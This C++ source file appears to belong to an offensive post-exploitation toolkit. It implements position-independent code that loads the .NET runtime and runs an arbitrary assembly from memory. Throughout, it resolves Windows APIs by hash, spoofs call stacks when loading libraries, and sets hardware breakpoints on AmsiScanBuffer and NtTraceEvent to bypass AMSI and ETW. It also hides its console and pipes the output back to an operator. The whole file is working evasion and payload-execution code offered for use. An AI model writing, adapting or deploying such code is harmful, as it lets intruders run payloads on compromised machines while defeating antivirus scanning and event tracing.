#include <General.hpp>

using namespace mscorlib;

auto DECLFN DotnetExec(
    BYTE*  AsmBytes,
    ULONG  AsmLength,
    WCHAR* Arguments,
    WCHAR* AppDomName,
    WCHAR* Version,
    BOOL   KeepLoad,
    INT32  BypassFlags
) -> BOOL {
    G_INSTANCE

    struct {
        GUID CLRMetaHost;
        GUID CorRuntimeHost;
    } xCLSID = {
        .CLRMetaHost    = { 0x9280188d, 0xe8e,  0x4867, { 0xb3, 0xc,  0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde } },
        .CorRuntimeHost = { 0xcb2f6723, 0xab3a, 0x11d2, { 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e } }
    };

    struct {
        GUID IHostControl;
        GUID AppDomain;
        GUID ICLRMetaHost;
        GUID ICLRRuntimeInfo;
        GUID ICorRuntimeHost;
        GUID IDispatch;
    } xIID = {
        .IHostControl     = { 0x02CA073C, 0x7079, 0x4860, { 0x88, 0x0A, 0xC2, 0xF7, 0xA4, 0x49, 0xC9, 0x91 } },
        .AppDomain        = { 0x05F696DC, 0x2B29, 0x3663, { 0xAD, 0x8B, 0xC4, 0x38, 0x9C, 0xF2, 0xA7, 0x13 } },
        .ICLRMetaHost     = { 0xD332DB9E, 0xB9B3, 0x4125, { 0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16 } },
        .ICLRRuntimeInfo  = { 0xBD39D1D2, 0xBA2F, 0x486a, { 0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91 } },
        .ICorRuntimeHost  = { 0xcb2f6722, 0xab3a, 0x11d2, { 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e } },
        .IDispatch        = { 0x00020400, 0x0000, 0x0000, { 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 } }
    };

    PWCHAR* AsmArgv   = { nullptr };
    ULONG   AsmArgc   = { 0 };
    BOOL    Success   = FALSE;
    BOOL    AlrdyCon  = TRUE;
    HANDLE  BackupPp  = INVALID_HANDLE_VALUE;
    HWND    WinHandle = nullptr;
    PVOID   Output    = nullptr;
    ULONG   OutLen    = 0;

    SAFEARRAYBOUND SafeBound = { 0 };
    SAFEARRAY*     SafeAsm   = { nullptr };
    SAFEARRAY*     SafeExpc  = { nullptr };
    SAFEARRAY*	   SafeArgs  = { nullptr };

    WCHAR FmVersion[MAX_PATH] = { 0 };
    ULONG FmBuffLen = MAX_PATH;

    BOOL             IsLoadable  = FALSE;
    HRESULT          HResult     = 0;
    VARIANT          VariantArgv = { 0 };
    IAssembly*       Assembly    = { nullptr };
    IAppDomain*      AppDom      = { nullptr };
    IMethodInfo*     MethodInfo  = { nullptr };
    IUnknown*        AppDomThunk = { nullptr };
    IUnknown*        EnumRtm     = { nullptr };
    IEnumUnknown*    EnumUkwn    = { nullptr };
    ICLRMetaHost*    MetaHost    = { nullptr };
    ICLRRuntimeInfo* RtmInfo     = { nullptr };
    ICorRuntimeHost* RtmHost     = { 0 };

    LONG Idx = 0;

    SECURITY_ATTRIBUTES SecAttr = { 0 };

    auto DotnetCleanup = [&]() {
        if ( Instance->Win32.GetConsoleWindow() && ! AlrdyCon ) { 
            Instance->Win32.FreeConsole();
        }

        if ( AsmArgv ) {
            Heap::Free( AsmArgv ); AsmArgv = nullptr;
        }

        if ( SafeAsm ) {
            Instance->Win32.SafeArrayDestroy( SafeAsm ); SafeAsm = nullptr;
        }

        if ( SafeArgs ) {
            Instance->Win32.SafeArrayDestroy( SafeArgs ); SafeArgs = nullptr;
        }

        if ( MethodInfo ) {
            MethodInfo->Release();
        }

        if ( RtmInfo ) {
            RtmInfo->Release();
        }

        if ( ! KeepLoad ) {
            RtmHost->UnloadDomain( AppDomThunk );
        } 

        if ( RtmHost ) {
            RtmHost->Release();
        }

        return HResult;
    };

    if ( Instance->Pipe.Fork ) {
        Instance->Pipe.Write = Instance->Win32.CreateNamedPipeA( 
            Instance->Pipe.Name, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_WAIT,
            PIPE_UNLIMITED_INSTANCES, PIPE_BUFFER_LENGTH, PIPE_BUFFER_LENGTH, 0, nullptr
        );
        if ( ! Instance->Pipe.Write || Instance->Pipe.Write == INVALID_HANDLE_VALUE ) {
            HResult = NtCurrentTeb()->LastErrorValue;
        }

        Instance->Win32.ConnectNamedPipe( Instance->Pipe.Write, nullptr );

        BackupPp = Instance->Win32.GetStdHandle( STD_OUTPUT_HANDLE );
        Instance->Win32.SetStdHandle( STD_OUTPUT_HANDLE, Instance->Pipe.Write );
    } 

    HResult = Instance->Win32.CLRCreateInstance( 
        xCLSID.CLRMetaHost, xIID.ICLRMetaHost, (PVOID*)&MetaHost 
    );
    if ( HResult || !MetaHost ) return DotnetCleanup();

    //
    //  get the last version if parameters is not passed
    //
    if ( ( Str::CompareW( Version, L"v0.0.00000" ) == 0 ) ) {
        HResult = MetaHost->EnumerateInstalledRuntimes( &EnumUkwn );
        if ( FAILED( HResult ) ) return DotnetCleanup();

        while ( EnumUkwn->Next( 1, &EnumRtm, 0 ) == S_OK) {
            if ( !EnumRtm ) continue;
    
            if ( SUCCEEDED( EnumRtm->QueryInterface( xIID.ICLRRuntimeInfo, (PVOID*)&RtmInfo) ) && RtmInfo ) {
                
                if ( SUCCEEDED( RtmInfo->GetVersionString( FmVersion, &FmBuffLen ) ) ) {
                    Version = FmVersion;
                }
            }
        }
    }

    HResult = MetaHost->GetRuntime( Version, xIID.ICLRRuntimeInfo, (PVOID*)&RtmInfo );
    if ( FAILED( HResult ) ) return DotnetCleanup();

    //
    // check if runtime is loadable
    //
    HResult = RtmInfo->IsLoadable( &IsLoadable );
    if ( HResult || !IsLoadable ) return DotnetCleanup();

    //
    // load clr version
    //
    HResult = RtmInfo->GetInterface( 
        xCLSID.CorRuntimeHost, xIID.ICorRuntimeHost, (PVOID*)&RtmHost 
    );
    if ( FAILED( HResult ) ) return DotnetCleanup();

    //
    // start the clr loaded
    //
    HResult = RtmHost->Start();
    if ( FAILED( HResult ) ) return DotnetCleanup();


    //
    // create the app domain
    //
    HResult = RtmHost->CreateDomain( AppDomName, 0, &AppDomThunk );
    if ( FAILED( HResult ) ) return DotnetCleanup();


    HResult = AppDomThunk->QueryInterface( xIID.AppDomain, (PVOID*)&AppDom );
    if ( FAILED( HResult ) ) return DotnetCleanup();


    SafeBound = { AsmLength, 0 };
    SafeAsm   = Instance->Win32.SafeArrayCreate( VT_UI1, 1, &SafeBound );

    //
    // copy the dotnet assembly to safe array
    //
    Mem::Copy( SafeAsm->pvData, AsmBytes, AsmLength );

    //
    // active hwbp to bypass amsi/etw
    //
    if ( BypassFlags ) {
        Hwbp::DotnetInit( BypassFlags );
    }

    //
    // load the dotnet
    //
    HResult = AppDom->Load_3( SafeAsm, &Assembly );
    if ( FAILED( HResult ) ) return DotnetCleanup();

    //
    // get the entry point
    //
    HResult = Assembly->get_EntryPoint( &MethodInfo );
    if ( FAILED( HResult ) ) return DotnetCleanup();


    //
    // get the parameters requirements
    //
    HResult = MethodInfo->GetParameters( &SafeExpc );
    if ( FAILED( HResult ) ) return DotnetCleanup();

    //
    // work with parameters requirements and do it
    //
	if ( SafeExpc ) {
		if ( SafeExpc->cDims && SafeExpc->rgsabound[0].cElements ) {
			SafeArgs = Instance->Win32.SafeArrayCreateVector( VT_VARIANT, 0, 1 );

			if ( Arguments ) {
                if ( Str::LengthW( Arguments ) ) {
                    AsmArgv = Instance->Win32.CommandLineToArgvW( Arguments, (PINT)&AsmArgc );
                }
			}

			VariantArgv.parray = Instance->Win32.SafeArrayCreateVector( VT_BSTR, 0, AsmArgc );
			VariantArgv.vt     = ( VT_ARRAY | VT_BSTR );

			for ( Idx = 0; Idx < AsmArgc; Idx++ ) {
				Instance->Win32.SafeArrayPutElement( VariantArgv.parray, &Idx, Instance->Win32.SysAllocString( AsmArgv[Idx] ) );
			}

			Idx = 0;
			Instance->Win32.SafeArrayPutElement( SafeArgs, &Idx, &VariantArgv );
			Instance->Win32.SafeArrayDestroy( VariantArgv.parray );
		}
	}

    //
    // set the console
    //
    WinHandle = Instance->Win32.GetConsoleWindow();

    if ( ! WinHandle ) {
        ALLOC_CONSOLE_OPTIONS* AllocOpt    = Heap::Alloc<ALLOC_CONSOLE_OPTIONS*>( sizeof( ALLOC_CONSOLE_OPTIONS ) );
        ALLOC_CONSOLE_RESULT*  AllocResult = Heap::Alloc<ALLOC_CONSOLE_RESULT*>( sizeof( ALLOC_CONSOLE_RESULT ) );
        
        AllocOpt->showWindow    = SW_HIDE;
        AllocOpt->mode          = ALLOC_CONSOLE_MODE_NO_WINDOW;
        AllocOpt->useShowWindow = FALSE;

        Instance->Win32.AllocConsoleWithOptions( AllocOpt, AllocResult );

        AlrdyCon = FALSE;
    }

    //
    // invoke/execute the dotnet assembly
    //
    HResult = MethodInfo->Invoke_3( VARIANT(), SafeArgs, nullptr );
    if ( FAILED( HResult ) ) return DotnetCleanup();

    //
    // desactive hwbp to bypass amsi/etw
    //
    if ( BypassFlags ) {
        Hwbp::DotnetExit();
    }


    if ( Instance->Pipe.Fork ) {
        if ( FAILED( HResult ) ) {
            Instance->Win32.WriteFile( Instance->Pipe.Write, &HResult, sizeof( HResult ), nullptr, 0 );
        }

        Instance->Win32.FlushFileBuffers( Instance->Pipe.Write );
        Instance->Win32.DisconnectNamedPipe( Instance->Pipe.Write );
        Instance->Win32.NtClose( Instance->Pipe.Write );
        Instance->Win32.SetStdHandle( STD_OUTPUT_HANDLE, BackupPp );
    }

    return DotnetCleanup();
}

auto DECLFN GetAssemblyLoaded(
    _In_  IAppDomain* AppDomain,
    _In_  WCHAR*      AsmName1,
    _In_  GUID        AsmIID, 
    _Out_ IAssembly** Assembly
) -> HRESULT {
    G_INSTANCE

    HRESULT    HResult  = S_OK;
    BSTR       AsmName2 = { nullptr };
    IAssembly* AsmTmp   = { nullptr };
    IUnknown** UnkDf    = { nullptr };

    LONG lLower = 0;
    LONG lUpper = 0;

    SAFEARRAY* SafeAsms = { nullptr };

    HResult = AppDomain->GetAssemblies( &SafeAsms );
    if ( FAILED( HResult ) ) return HResult;

    Instance->Win32.SafeArrayGetLBound( SafeAsms, 1, &lLower );
    Instance->Win32.SafeArrayGetUBound( SafeAsms, 1, &lUpper );

    Instance->Win32.SafeArrayAccessData( SafeAsms, (PVOID*)&UnkDf );

    for ( LONG i = lLower; i <= lUpper; i++ ) {
        IUnknown* UnkTmp = UnkDf[i];
        if ( ! UnkTmp ) continue;

        AsmTmp = nullptr;
        HResult  = UnkTmp->QueryInterface( AsmIID, (PVOID*)&AsmTmp );
        if ( SUCCEEDED( HResult ) && AsmTmp ) {
            HResult = AsmTmp->get_ToString( &AsmName2 );
            if ( FAILED( HResult ) ) return HResult;

            Instance->Win32.SysFreeString( AsmName2 );
        }

        UnkTmp->Release();
    }

    return HResult;
}

auto DECLFN GetExitPTr(
    _In_ ICorRuntimeHost* IRuntime
) -> PVOID {
    G_INSTANCE

    HRESULT HResult = S_OK;

    IAppDomain* AppDomain     = { nullptr };
    IAssembly*  Mscorlib      = { nullptr };
    IUnknown*   AppDomUnknown = { nullptr };

    PVOID SystemExitPtr = nullptr;

    SAFEARRAY* SafeEmpty = { nullptr };

    IPropertyInfo* MtdHandleProp = { nullptr };
    IType*         SysEnvClass   = { nullptr };
    IType*         ReflectClass  = { nullptr };
    IType*         RtmMethod     = { nullptr };

    IMethodInfo*  ExitMethod   = { nullptr };
    IMethodInfo*  GetFncMethod = { nullptr };
    IBindingFlags BindFlags_1  = (IBindingFlags)( IBindingFlags::BindingFlags_Instance | IBindingFlags::BindingFlags_Public );
    IBindingFlags ExitFlags    = (IBindingFlags)( IBindingFlags::BindingFlags_Public | IBindingFlags::BindingFlags_Static );

    VARIANT VarExitPtr   = { 0 };
    VARIANT VarMethodPtr = { 0 };
    VARIANT VarMethodVal = { 0 };

    BSTR AsmName     = { nullptr };
    BSTR MHandleBstr  = Instance->Win32.SysAllocString( L"MethodHandle" );
    BSTR ReflBstr     = Instance->Win32.SysAllocString( L"System.Reflection.MethodInfo" );
    BSTR GetFncBstr   = Instance->Win32.SysAllocString( L"GetFunctionPointer" );
    BSTR RtmBstr      = Instance->Win32.SysAllocString( L"System.RuntimeMethodHandle" );
    BSTR SysEnvBstr   = Instance->Win32.SysAllocString( L"System.Environment" );
    BSTR ExitBstr     = Instance->Win32.SysAllocString( L"Exit" );

    IID xIIDMscorlibAsm = { 0x17156360, 0x2F1A, 0x384A, { 0xBC, 0x52, 0xFD, 0xE9, 0x3C, 0x21, 0x5C, 0x5B } };
    IID xIIDAppDomain   = { 0x05F696DC, 0x2B29, 0x3663, { 0xAD, 0x8B, 0xC4, 0x38, 0x9C, 0xF2, 0xA7, 0x13 } };

    HResult = IRuntime->GetDefaultDomain( (IUnknown**)&AppDomUnknown );
    if ( FAILED( HResult ) ) goto _BOF_END;

    HResult = AppDomUnknown->QueryInterface( xIIDAppDomain, (PVOID*)&AppDomain );
    if ( FAILED( HResult ) ) goto _BOF_END;

    HResult = GetAssemblyLoaded( AppDomain, L"mscorlib", xIIDMscorlibAsm, &Mscorlib );
    if ( FAILED( HResult ) ) goto _BOF_END;

    HResult = Mscorlib->GetType_2( ReflBstr, &ReflectClass );
    if ( FAILED( HResult ) ) goto _BOF_END;

    HResult = Mscorlib->GetType_2( SysEnvBstr, &SysEnvClass );
    if ( FAILED( HResult ) ) goto _BOF_END;

    HResult = Mscorlib->GetType_2( RtmBstr, &RtmMethod );
    if ( FAILED( HResult ) ) goto _BOF_END;
    
    HResult = ReflectClass->GetProperty( MHandleBstr, BindFlags_1, &MtdHandleProp );
    if ( FAILED( HResult ) ) goto _BOF_END;

    HResult = SysEnvClass->GetMethod_2( ExitBstr, ExitFlags, &ExitMethod );
    if ( FAILED( HResult ) ) goto _BOF_END;

    HResult = RtmMethod->GetMethod_2( GetFncBstr, BindFlags_1, &GetFncMethod );
    if ( FAILED( HResult ) ) goto _BOF_END;

    SafeEmpty = Instance->Win32.SafeArrayCreateVector( VT_EMPTY, 0, 0 );

    VarMethodPtr.vt      = VT_UNKNOWN;
    VarMethodPtr.punkVal = ExitMethod;

    HResult = MtdHandleProp->GetValue( VarMethodPtr, SafeEmpty, &VarMethodVal );
    if ( FAILED( HResult ) ) goto _BOF_END;

    HResult = GetFncMethod->Invoke_3( VarMethodVal, SafeEmpty, &VarExitPtr );
    if ( FAILED( HResult ) ) goto _BOF_END;

    Instance->Hwbp.ExitPtr = VarExitPtr.byref;

_BOF_END:
    if ( MHandleBstr ) Instance->Win32.SysFreeString( MHandleBstr );
    if ( ReflBstr    ) Instance->Win32.SysFreeString( ReflBstr );
    if ( GetFncBstr  ) Instance->Win32.SysFreeString( GetFncBstr );
    if ( RtmBstr     ) Instance->Win32.SysFreeString( RtmBstr );
    if ( SysEnvBstr  ) Instance->Win32.SysFreeString( SysEnvBstr );
    if ( ExitBstr    ) Instance->Win32.SysFreeString( ExitBstr );
    if ( SafeEmpty   ) Instance->Win32.SafeArrayDestroy( SafeEmpty );

    Instance->Win32.VariantClear( &VarExitPtr );
    Instance->Win32.VariantClear( &VarMethodPtr );
    Instance->Win32.VariantClear( &VarMethodVal );

    if ( MtdHandleProp ) MtdHandleProp->Release();
    if ( SysEnvClass   ) SysEnvClass->Release();
    if ( ReflectClass  ) ReflectClass->Release();
    if ( RtmMethod     ) RtmMethod->Release();
    if ( ExitMethod    ) ExitMethod->Release();
    if ( GetFncMethod  ) GetFncMethod->Release();
    if ( Mscorlib      ) Mscorlib->Release();
    if ( AppDomain     ) AppDomain->Release();
    if ( AppDomUnknown ) AppDomUnknown->Release();

    return SystemExitPtr;
}

auto DECLFN LibLoad( CHAR* LibName, BOOL Spoof ) -> UPTR {
    G_INSTANCE

    if ( ! Spoof ) {
        return (UPTR)Instance->Win32.LoadLibraryA( LibName );
    }

    return (UPTR)Spoof::Call( Instance->Win32.LoadLibraryA, 0, (PVOID)LibName );
}

EXTERN_C
auto DECLFN Entry( PVOID Parameter ) -> VOID {
    PARSER   Psr      = { 0 };
    INSTANCE Instance = { 0 };

    PVOID ArgBuffer = nullptr;

    NtCurrentPeb()->TelemetryCoverageHeader = (PTELEMETRY_COVERAGE_HEADER)&Instance;

    Instance.Start      = StartPtr();
    Instance.Size       = (UPTR)EndPtr() - (UPTR)Instance.Start;
    Instance.HeapHandle = NtCurrentPeb()->ProcessHeap;

    Parameter ? ArgBuffer = Parameter : ArgBuffer = (PVOID)( (UPTR)Instance.Start + Instance.Size );

    UPTR Ntdll    = LoadModule( HashStr( "ntdll.dll" ) );
    UPTR Kernel32 = LoadModule( HashStr( "kernel32.dll" ) );
    UPTR User32   = LoadModule( HashStr( "user32.dll" ) );
    UPTR Shell32  = LoadModule( HashStr( "shell32.dll" ) );
    UPTR Oleaut32 = LoadModule( HashStr( "oleaut32.dll" ) );
    UPTR Mscoree  = LoadModule( HashStr( "mscoree.dll" ) );
    UPTR Amsi     = LoadModule( HashStr( "amsi.dll" ) );

    Instance.Win32.DbgPrint = (decltype(Instance.Win32.DbgPrint))LoadApi(Ntdll, HashStr("DbgPrint"));

    Instance.Win32.LoadLibraryA = (decltype(Instance.Win32.LoadLibraryA))LoadApi(Kernel32, HashStr("LoadLibraryA"));

    if ( ! User32   ) User32   = (UPTR)LibLoad( "user32.dll", TRUE );
    if ( ! Shell32  ) Shell32  = (UPTR)LibLoad( "shell32.dll", TRUE );
    if ( ! Oleaut32 ) Oleaut32 = (UPTR)LibLoad( "oleaut32.dll", TRUE );
    if ( ! Mscoree  ) Mscoree  = (UPTR)LibLoad( "mscoree.dll", TRUE );
    if ( ! Amsi     ) Amsi     = (UPTR)LibLoad( "amsi.dll", TRUE );

    Instance.Win32.NtClose = (decltype(Instance.Win32.NtClose))LoadApi(Ntdll, HashStr("NtClose"));

    Instance.Win32.GetProcAddress   = (decltype(Instance.Win32.GetProcAddress))LoadApi(Kernel32, HashStr("GetProcAddress"));
    Instance.Win32.GetModuleHandleA = (decltype(Instance.Win32.GetModuleHandleA))LoadApi(Kernel32, HashStr("GetModuleHandleA"));

    Instance.Win32.NtProtectVirtualMemory = (decltype(Instance.Win32.NtProtectVirtualMemory))LoadApi(Ntdll, HashStr("NtProtectVirtualMemory"));

    Instance.Win32.RtlAllocateHeap   = (decltype(Instance.Win32.RtlAllocateHeap))LoadApi(Ntdll, HashStr("RtlAllocateHeap"));
    Instance.Win32.RtlReAllocateHeap = (decltype(Instance.Win32.RtlReAllocateHeap))LoadApi(Ntdll, HashStr("RtlReAllocateHeap"));
    Instance.Win32.RtlFreeHeap       = (decltype(Instance.Win32.RtlFreeHeap))LoadApi(Ntdll, HashStr("RtlFreeHeap"));

    Instance.Win32.CLRCreateInstance = (decltype(Instance.Win32.CLRCreateInstance))LoadApi(Mscoree, HashStr("CLRCreateInstance"));

    Instance.Win32.SafeArrayAccessData   = (decltype(Instance.Win32.SafeArrayAccessData))LoadApi(Oleaut32, HashStr("SafeArrayAccessData"));
    Instance.Win32.SafeArrayGetLBound    = (decltype(Instance.Win32.SafeArrayGetLBound))LoadApi(Oleaut32, HashStr("SafeArrayGetLBound"));        
    Instance.Win32.SafeArrayGetUBound    = (decltype(Instance.Win32.SafeArrayGetUBound))LoadApi(Oleaut32, HashStr("SafeArrayGetUBound"));
    Instance.Win32.SafeArrayCreateVector = (decltype(Instance.Win32.SafeArrayCreateVector))LoadApi(Oleaut32, HashStr("SafeArrayCreateVector"));
    Instance.Win32.SafeArrayCreate       = (decltype(Instance.Win32.SafeArrayCreate))LoadApi(Oleaut32, HashStr("SafeArrayCreate"));
    Instance.Win32.SafeArrayDestroy      = (decltype(Instance.Win32.SafeArrayDestroy))LoadApi(Oleaut32, HashStr("SafeArrayDestroy"));
    Instance.Win32.SafeArrayPutElement   = (decltype(Instance.Win32.SafeArrayPutElement))LoadApi(Oleaut32, HashStr("SafeArrayPutElement"));
    Instance.Win32.SysAllocString        = (decltype(Instance.Win32.SysAllocString))LoadApi(Oleaut32, HashStr("SysAllocString"));
    Instance.Win32.SysFreeString         = (decltype(Instance.Win32.SysFreeString))LoadApi(Oleaut32, HashStr("SysFreeString"));
    Instance.Win32.VariantClear          = (decltype(Instance.Win32.VariantClear))LoadApi(Oleaut32, HashStr("VariantClear"));


    Instance.Win32.CommandLineToArgvW = (decltype(Instance.Win32.CommandLineToArgvW))LoadApi(Shell32, HashStr("CommandLineToArgvW"));

    Instance.Win32.GetConsoleWindow        = (decltype(Instance.Win32.GetConsoleWindow))LoadApi(Kernel32, HashStr("GetConsoleWindow"));
    Instance.Win32.AllocConsoleWithOptions = (decltype(Instance.Win32.AllocConsoleWithOptions))LoadApi(Kernel32, HashStr("AllocConsoleWithOptions"));
    Instance.Win32.FreeConsole             = (decltype(Instance.Win32.FreeConsole))LoadApi(Kernel32, HashStr("FreeConsole"));

    Instance.Win32.CreatePipe          = (decltype(Instance.Win32.CreatePipe))LoadApi(Kernel32, HashStr("CreatePipe"));
    Instance.Win32.CreateNamedPipeA    = (decltype(Instance.Win32.CreateNamedPipeA))LoadApi(Kernel32, HashStr("CreateNamedPipeA"));
    Instance.Win32.ConnectNamedPipe    = (decltype(Instance.Win32.ConnectNamedPipe))LoadApi(Kernel32, HashStr("ConnectNamedPipe"));
    Instance.Win32.DisconnectNamedPipe = (decltype(Instance.Win32.DisconnectNamedPipe))LoadApi(Kernel32, HashStr("DisconnectNamedPipe"));
    Instance.Win32.FlushFileBuffers    = (decltype(Instance.Win32.FlushFileBuffers))LoadApi(Kernel32, HashStr("FlushFileBuffers"));
    Instance.Win32.ReadFile            = (decltype(Instance.Win32.ReadFile))LoadApi(Kernel32, HashStr("ReadFile"));
    Instance.Win32.WriteFile           = (decltype(Instance.Win32.WriteFile))LoadApi(Kernel32, HashStr("WriteFile"));
    Instance.Win32.SetStdHandle        = (decltype(Instance.Win32.SetStdHandle))LoadApi(Kernel32, HashStr("SetStdHandle"));
    Instance.Win32.GetStdHandle        = (decltype(Instance.Win32.GetStdHandle))LoadApi(Kernel32, HashStr("GetStdHandle"));

    Instance.Win32.NtGetContextThread = (decltype(Instance.Win32.NtGetContextThread))LoadApi(Ntdll, HashStr("NtGetContextThread"));
    Instance.Win32.NtContinue         = (decltype(Instance.Win32.NtContinue))LoadApi(Ntdll, HashStr("NtContinue"));
    Instance.Win32.RtlCaptureContext  = (decltype(Instance.Win32.RtlCaptureContext))LoadApi(Ntdll, HashStr("RtlCaptureContext"));

    Instance.Win32.RtlAddVectoredExceptionHandler    = (decltype(Instance.Win32.RtlAddVectoredExceptionHandler))LoadApi(Ntdll, HashStr("RtlAddVectoredExceptionHandler"));
    Instance.Win32.RtlRemoveVectoredExceptionHandler = (decltype(Instance.Win32.RtlRemoveVectoredExceptionHandler))LoadApi(Ntdll, HashStr("RtlRemoveVectoredExceptionHandler"));

    Instance.Win32.RtlInitializeCriticalSection = (decltype(Instance.Win32.RtlInitializeCriticalSection))LoadApi(Ntdll, HashStr("RtlInitializeCriticalSection"));
    Instance.Win32.RtlEnterCriticalSection = (decltype(Instance.Win32.RtlEnterCriticalSection))LoadApi(Ntdll, HashStr("RtlEnterCriticalSection"));
    Instance.Win32.RtlLeaveCriticalSection = (decltype(Instance.Win32.RtlLeaveCriticalSection))LoadApi(Ntdll, HashStr("RtlLeaveCriticalSection"));

    Instance.Win32.RtlLookupFunctionEntry = (decltype(Instance.Win32.RtlLookupFunctionEntry))LoadApi(Ntdll, HashStr("RtlLookupFunctionEntry"));
    Instance.Win32.RtlUserThreadStart     = (decltype(Instance.Win32.RtlUserThreadStart))LoadApi(Ntdll, HashStr("RtlUserThreadStart"));
    Instance.Win32.BaseThreadInitThunk    = (decltype(Instance.Win32.BaseThreadInitThunk))LoadApi(Kernel32, HashStr("BaseThreadInitThunk"));

    Instance.Hwbp.NtTraceEvent   = (PVOID)LoadApi(Ntdll, HashStr("NtTraceEvent"));
    Instance.Hwbp.AmsiScanBuffer = (PVOID)LoadApi(Amsi, HashStr("AmsiScanBuffer"));

    Parser::New( &Psr, ArgBuffer );

    HRESULT Result = S_OK;

    ULONG Length    = 0;
    BYTE* Buffer    = Parser::Bytes( &Psr, &Length );
    CHAR* Arguments = Parser::Str( &Psr );
    CHAR* AppDomain = Parser::Str( &Psr );
    CHAR* FmVersion = Parser::Str( &Psr );
    ULONG KeepLoad  = Parser::Int32( &Psr );
    ULONG Bypass    = Parser::Int32( &Psr );
    BOOL  IsSpoof   = Parser::Int32( &Psr );

    ULONG AppDomainL = Str::LengthA( AppDomain ) * sizeof( WCHAR );
    ULONG VersionL   = Str::LengthA( FmVersion ) * sizeof( WCHAR );
    ULONG ArgumentsL = Str::LengthA( Arguments ) * sizeof( WCHAR );

    WCHAR* wArguments  = Heap::Alloc<WCHAR*>( ArgumentsL );
    WCHAR* wVersion    = Heap::Alloc<WCHAR*>( VersionL );
    WCHAR* wAppDomName = Heap::Alloc<WCHAR*>( AppDomainL );

    Str::CharToWChar( wArguments, Arguments, ArgumentsL );
    Str::CharToWChar( wVersion, FmVersion, VersionL );
    Str::CharToWChar( wAppDomName, AppDomain, AppDomainL );

    Result = DotnetExec( Buffer, Length, wArguments, wAppDomName, wVersion, KeepLoad, Bypass );
}